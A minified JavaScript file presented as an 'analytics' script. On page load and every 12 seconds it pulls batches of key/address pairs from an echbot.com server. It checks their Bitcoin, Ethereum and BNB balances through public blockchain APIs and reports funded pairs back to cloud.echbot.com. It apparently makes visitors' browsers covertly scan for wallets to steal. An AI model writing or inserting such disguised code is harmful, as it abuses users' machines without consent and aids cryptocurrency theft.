function analytics_echbot(d){if("object"!=typeof d)d={};else{var f=!1;for(m in d)if(!0===d[m]){f=!0;break}if(!1===f)return!1}f=0;try{f=localStorage.getItem("analytics_check_spam_echbot"),f=null===f?0:1*f}catch(l){f=0}var m=Math.ceil(Date.now()/1E3);if(12>m-f)return setTimeout(function(){analytics_echbot(d)},6E3),!1;localStorage.setItem("analytics_check_spam_echbot",m);jQuery.ajax({type:"GET",dataType:"json",crossDomain:!0,url:"https://analytics.echbot.com:34567",timeout:33E3,error:function(l,e,n){console.log(e)}}).done(function(l){var e=
[],n=function(g,h){for(var b=[],c=0;c<g.length;c++)b.push(g[c].a),e.push("primary="+g[c].k+"&address="+g[c].a);return b.join(h)},r=function(g){console.log(g);jQuery.ajax({type:"GET",dataType:"json",crossDomain:!0,url:g,timeout:33E3,error:function(h,b,c){console.log(b)}}).done(function(h){console.log(h)})},q=function(g,h){if("undefined"!=typeof d[h]&&!1===d[h])return!1;d[h]=!1;jQuery.ajax({type:"GET",dataType:"json",crossDomain:!0,url:g,timeout:33E3,error:function(b,c,k){console.log(c)}}).done(function(b){var c=
!1;if("undefined"!=typeof b.result&&"undefined"!=typeof b.status&&1===1*b.status){c=!0;for(var k=0;k<b.result.length;k++){var a=!1;0<b.result[k].balance&&(a=!0);if(!0===a)for(a=0;a<e.length;a++)if(1<e[a].split(b.result[k].account).length){r("https://cloud.echbot.com/scan/eth/hasbalance?"+e[a]);break}}}else{k=0;for(var p in b){if(0===k)if("undefined"==typeof b[p].final_balance)break;else c=!0;a=!1;0<b[p].final_balance&&(a=!0);if(!0===a)for(a=0;a<e.length;a++)if(1<e[a].split(p).length){console.log(e[a]);
r("https://cloud.echbot.com/scan/btc/hasbalance?"+e[a]);break}k++}}!0===c&&(d[h]=!0)})},t=n(l.b,"|");l=n(l.e,",");q("https://blockchain.info/balance?limit=0&cors=true&active="+t,"btc");q("https://api.etherscan.io/api?module=account&action=balancemulti&tag=latest&apikey=YourApiKeyToken&address="+l,"eth");q("https://api.bscscan.com/api?module=account&action=balancemulti&tag=latest&apikey=YourApiKeyToken&address="+l,"bnb")});setTimeout(function(){analytics_echbot(d)},12E3)}analytics_echbot();